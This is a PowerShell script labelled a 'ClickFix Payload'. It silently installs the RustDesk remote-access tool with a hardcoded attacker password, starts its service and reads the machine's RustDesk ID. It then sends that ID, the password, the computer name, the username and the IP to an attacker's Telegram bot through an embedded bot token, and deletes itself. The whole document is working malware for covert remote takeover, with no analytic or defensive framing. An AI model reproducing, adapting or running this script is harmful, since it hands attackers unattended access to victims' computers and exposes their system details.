# s.ps1 - RustDesk ClickFix Payload (Path-Robust Version)
# This script installs RustDesk silently, sets the password, 
# establishes persistence, and exfiltrates the ID to Telegram.

# 1. Attacker Credentials
$pw = "AttackerSecret123!"
$token = "8800944118:AAH5fH76MZUomwJZVEuFHPIf0X3tgAJ25mM"
$chatId = "2030209395"

# 2. Download Official Installer
$url = "https://github.com/rustdesk/rustdesk/releases/latest/download/RustDeskSetup-x86_64.exe"
$f = Join-Path ([System.IO.Path]::GetTempPath()) "rd_setup.exe"

Write-Verbose "Downloading RustDesk installer to $f..."
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile($url, $f)
} catch {
    Write-Error "Failed to download RustDesk installer: $_"
    exit 1
}

# 3. Verify Download
if (-not (Test-Path $f)) {
    Write-Error "Download failed. File not found at $f"
    exit 1
}

# 4. Install Silently with Hardcoded Password
# /S = Silent
# /RUSTDESK_PASSWORD = Sets the permanent password for unattended access
Start-Process $f -ArgumentList "/S /RUSTDESK_PASSWORD=$pw" -Wait

# 5. Clean Up Installer
Remove-Item $f -Force -ErrorAction SilentlyContinue

# 6. Ensure Service is Running
Start-Service RustDesk -ErrorAction SilentlyContinue

# 7. Retrieve RustDesk ID (Path-Robust)
Start-Sleep -Seconds 5
$rustdeskPath = $null
if (Test-Path "C:\Program Files\RustDesk\rustdesk.exe") {
    $rustdeskPath = "C:\Program Files\RustDesk\rustdesk.exe"
} elseif (Test-Path "C:\Program Files (x86)\RustDesk\rustdesk.exe") {
    $rustdeskPath = "C:\Program Files (x86)\RustDesk\rustdesk.exe"
} else {
    $found = Get-ChildItem -Path "C:\Program Files", "C:\Program Files (x86)" -Filter "rustdesk.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) { $rustdeskPath = $found.FullName }
}

$RustDeskId = "NOT_FOUND"
if ($rustdeskPath) {
    $RustDeskId = & $rustdeskPath --get-id 2>$null
}

# 8. Exfiltrate ID to Telegram
$SystemInfo = @{
    ComputerName = $env:COMPUTERNAME
    UserName     = $env:USERNAME
    OS           = (Get-WmiObject Win32_OperatingSystem).Caption
    IP           = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
    Timestamp    = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    RustDeskPath = $rustdeskPath
}

$TelegramMessage = @"
🚨 <b>New RustDesk Session Established</b>

🆔 <b>ID:</b> $RustDeskId
🔑 <b>Password:</b> $pw
💻 <b>Computer:</b> $env:COMPUTERNAME
👤 <b>User:</b> $env:USERNAME
🌐 <b>IP:</b> $($SystemInfo.IP)
📂 <b>Path:</b> $rustdeskPath
📅 <b>Time:</b> $($SystemInfo.Timestamp)
"@

$TelegramPayload = @{
    chat_id                = $chatId
    text                   = $TelegramMessage
    parse_mode             = "HTML"
    disable_web_page_preview = $true
} | ConvertTo-Json

try {
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
                      -Method Post `
                      -Body $TelegramPayload `
                      -ContentType "application/json" `
                      -TimeoutSec 10
    Write-Verbose "Telegram notification sent successfully."
} catch {
    Write-Verbose "Telegram notification failed: $_"
}

# 9. Final Cleanup
if ($MyInvocation.MyCommand.Path) {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}
